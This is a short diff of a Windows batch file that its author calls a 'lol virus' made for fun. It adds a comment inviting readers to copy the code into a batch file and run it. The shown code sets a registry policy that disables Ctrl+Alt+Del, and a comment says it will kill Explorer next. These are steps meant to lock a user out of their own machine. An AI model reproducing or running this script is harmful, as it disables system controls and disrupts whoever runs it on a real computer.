@@ -1,5 +1,6 @@
 @echo off
 :: lol virus was made by me i made this for fun
+:: if you want to run it for some reason copy the code on to a batch file / on your desktop as well 
 
 :: setup registry keys before killing explorer
 reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCAD /t REG_DWORD /d 1
